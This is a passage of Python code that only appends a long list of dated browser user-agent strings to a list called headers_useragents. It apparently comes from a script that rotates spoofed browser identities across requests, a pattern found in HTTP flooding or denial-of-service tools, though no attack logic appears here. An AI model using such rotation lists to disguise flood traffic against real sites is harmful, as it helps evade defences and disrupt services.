	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.4) Gecko/20070508 Iceweasel/2.0.0.4 (Debian-2.0.0.4-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070723 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070803 Firefox/2.0.0.6 (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.8.1.6) Gecko/20070914 Firefox/2.0.0.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.4) Gecko/2008111317 Linux Mint/5 (Elyssa) Firefox/3.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.4) Gecko/2008111317 Ubuntu/8.04 (hardy) Firefox/3.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.7) Gecko/2009032803 Iceweasel/3.0.6 (Debian-3.0.6-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.0.9) Gecko/2009042113 Ubuntu/9.04 (jaunty) Firefox/3.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.1.8) Gecko/20100214 Ubuntu/9.10 (karmic) Firefox/3.5.8')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-AR; rv:1.9b5) Gecko/2008041514 Firefox/3.0b5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.7.12) Gecko/20050929')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.11) Gecko/20070327 Ubuntu/dapper-security Firefox/1.5.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.4) Gecko/20060608 Ubuntu/dapper-security Firefox/1.5.0.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.0.7) Gecko/20060830 Firefox/1.5.0.7 (Debian-1.5.dfsg+1.5.0.7-1~bpo.1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.12) Gecko/20080213 Firefox/2.0.0.12')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.13) Gecko/20080311 Iceweasel/2.0.0.13 (Debian-2.0.0.13-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080404 Iceweasel/2.0.0.14 (Debian-2.0.0.14-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.14) Gecko/20080419 Ubuntu/8.04 (hardy) Firefox/2.0.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.18) Gecko/20081030 Iceweasel/2.0.0.18 (Debian-2.0.0.18-0etch1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20060601 Firefox/2.0.0.2 (Ubuntu-edgy)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20070220 Firefox/2.0.0.2')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.2) Gecko/20070225 Firefox/2.0.0.2 (Swiftfox)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.4) Gecko/20061201 Firefox/2.0.0.4 (Ubuntu-feisty)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.5) Gecko/20070718 Fedora/2.0.0.5-1.fc7 Firefox/2.0.0.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.8.1.9) Gecko/20071025 Iceweasel/2.0.0.9 (Debian-2.0.0.9-2)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.10) Gecko/2009042513 Linux Mint/5 (Elyssa) Firefox/3.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.10) Gecko/2009042523 Ubuntu/9.04 (jaunty) Firefox/3.0.10')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060309 Linux Mint/5 (Elyssa) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009060310 Ubuntu/8.10 (intrepid) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061118 Fedora/3.0.11-1.fc9 Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061212 Iceweasel/3.0.6 (Debian-3.0.6-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.11) Gecko/2009061319 Iceweasel/3.0.11 (Debian-3.0.11-1)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.0.14) Gecko/2009090216 Firefox/3.0.14')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.16) Gecko/20111108 Iceweasel/3.5.16 (like Firefox/3.5.16)')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.6) Gecko/20091201 SUSE/3.5.6-1.1.1 Firefox/3.5.6 GTB6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.7) Gecko/20091222 SUSE/3.5.7-1.1.1 Firefox/3.5.7')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.1.9) Gecko/20100317 SUSE/3.5.9-0.1 Firefox/3.5.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.13) Gecko/20101206 Ubuntu/9.10 (karmic) Firefox/3.6.13')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; es-ES; rv:1.9.2.17pre) Gecko/20110404 Ubuntu/10.10 (Maverick) Namoroka/3.6.17pre')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; eu; rv:1.9.0.6) Gecko/2009012700 SUSE/3.0.6-0.1.2 Firefox/3.0.6')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fa; rv:1.8.1.4) Gecko/20100527 Firefox/3.6.4')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.11) Gecko/2009060308 Ubuntu/9.04 (jaunty) Firefox/3.0.11')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.13) Gecko/2009080315 Linux Mint/6 (Felicia) Firefox/3.0.13')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.5) Gecko/2008121622 Ubuntu/8.10 (intrepid) Firefox/3.0.5')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.0.9) Gecko/2009042113 Ubuntu/9.04 (jaunty) Firefox/3.0.9')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8')
	 	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; fr-FR; rv:0.9.4) Gecko/20011126 Netscape6/6.2.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; it; rv:1.9.2.12) Gecko/20101114 IceCat/3.6.12 (like Firefox/3.6.12)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.0.3.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.1.1.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528+ (KHTML, like Gecko, Safari/528.0) Lunascape/5.1.2.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0 Safari/533.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja-JP) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.8.1.16) Gecko/20080702 Firefox/2.0.0.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.15) Gecko/20101029 Firefox/3.5.15 Lunascape/6.3.4.23051 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7 GTB6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.12) Gecko/20101029 Firefox/3.6.12 Lunascape/6.3.4.23051 ( .NET CLR 3.5.30729; .NET4.0C)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ja; rv:1.9.3a5pre) Gecko/20100605 Minefield/3.7a5pre ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ko; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ko; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nb-NO) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.11.3 (KHTML, like Gecko) Version/3.0 Safari/522.11.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl) AppleWebKit/522.13.1 (KHTML, like Gecko) Version/3.0.2 Safari/522.13.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.1.9) Gecko/20100315 Firefox/3.5.9 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; nl; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/525.19 (KHTML, like Gecko) Version/3.1.2 Safari/525.21')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl-PL) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.14) Gecko/20080519 Firefox/2.0.0.14 Flock/1.2.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 GTB7.1 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9.2.16) Gecko/20110319 Firefox/3.6.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.9b4) Gecko/2008030714 Firefox/3.0b4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; pt-BR; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru-RU) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12; MEGAUPLOAD 2.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1.5) Gecko/20091102 MRA 5.5 (build 02842) Firefox/3.5.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.1b4pre) Gecko/20090419 SeaMonkey/2.0b1pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; ru; rv:1.9.2) Gecko/20100115 Firefox/3.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; rv:1.9.1b4pre) Gecko/20090419 SeaMonkey/2.0b1pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sr; rv:1.9.0.12) Gecko/2009070611 Firefox/3.0.12')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/523.13 (KHTML, like Gecko) Version/3.0 Safari/523.13')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE) AppleWebKit/525.27.1 (KHTML, like Gecko) Version/3.2.1 Safari/525.27.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.0.18) Gecko/2010020220 Firefox/3.0.18 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; sv-SE; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr-TR) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.8.1.9) Gecko/20071025 Firefox/2.0.0.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; tr; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; x64; en-US; rv:1.9.1b2pre) Gecko/20081026 Firefox/3.1b2pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.19')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.0.19) Gecko/2010031422 Firefox/3.0.19 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-CN; rv:1.9.2.6) Gecko/20100625 Firefox/3.6.6 GTB7.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.8.1.5) Gecko/20070713 Firefox/2.0.0.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; zh-TW; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; cs; rv:1.9.2.6) Gecko/20100723 myibrow/4.0.0.0 (Firefox/3.6 compatible)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; WOW64; en-US; rv:2.0.4) Gecko/20120718 AskTbAVR-IDW/3.12.5.17700 Firefox/14.0.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ar; rv:1.9.2) Gecko/20100115 Firefox/3.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ar; rv:1.9.2.18) Gecko/20110614 Firefox/3.6.18')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ca; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs-CZ) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.4 Safari/533.20.27')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 ( .NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.4) Gecko/20100513 Firefox/3.6.4 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2a2pre) Gecko/20090912 Namoroka/3.6a2pre (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-AT; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/525.28 (KHTML, like Gecko) Version/3.2.2 Safari/525.28.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/7.0.540.0 Safari/534.10')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.224 Safari/534.10')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE) AppleWebKit/534.17 (KHTML, like Gecko) Chrome/10.0.649.0 Safari/534.17')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de-DE; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1) Gecko/20090624 Firefox/3.5 (.NET CLR 4.0.20506)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.1) Gecko/20090715 Firefox/3.5.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.11) Gecko/20100701 Firefox/3.5.11 ( .NET CLR 3.5.30729; .NET4.0C)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.16) Gecko/20101130 AskTbMYC/3.9.1.14019 Firefox/3.5.16')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.18) Gecko/20110320 SeaMonkey/2.0.13')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.19) Gecko/20110420 SeaMonkey/2.0.14')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.3) Gecko/20121221 Firefox/3.6.8')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.3a1pre) Gecko/20091013 Minefield/3.7a1pre')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-AU; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-CA; rv:1.9.0.5) Gecko/2009012102 Firefox/3.0.5 Flock/2.0.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB) AppleWebKit/534.1 (KHTML, like Gecko) Chrome/6.0.428.0 Safari/534.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.20')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.0.16) Gecko/2010021003 Firefox/3.0.16 Flock/2.5.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.0.5) Gecko/2009012105 Firefox/3.0.5 Flock/2.0.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2) Gecko/20070225 lolifox/0.32')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 SeaMonkey/2.0.12')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5 (.NET CLR 3.5.30729)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.3) Gecko/20100401 Firefox/3.6;MEGAUPLOAD 1.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.2.8) Gecko/20100722 Firefox/3.6.8 ( .NET CLR 3.5.30729; .NET4.0C)')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.3.154.9 Safari/525.19')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.43 Safari/525.19')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.53 Safari/525.19')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.7 (KHTML, like Gecko) Iron/1.0.155.0 Safari/528.7')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/1.0.156.0 Safari/528.8')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/528.8 (KHTML, like Gecko) Chrome/2.0.156.1 Safari/528.8')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.19.2 (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.5 (KHTML, like Gecko) Chrome/2.0.172.43 Safari/530.5')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.6 (KHTML, like Gecko) Chrome/2.0.174.0 Safari/530.6')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/530.9 (KHTML, like Gecko) Iron/2.0.178.0 Safari/530.9')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/531.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/2.0.182.0 Safari/532.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Chrome/3.0.191.0 Safari/531.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.0 (KHTML, like Gecko) Iron/3.0.189.0 Safari/531.0')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.3 (KHTML, like Gecko) Chrome/3.0.193.2 Safari/531.3')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/531.4 (KHTML, like Gecko) Chrome/3.0.194.0 Safari/531.4')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532+ (KHTML, like Gecko) Version/4.0.2 Safari/530.19.1')
	 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.1 Safari/532.0')
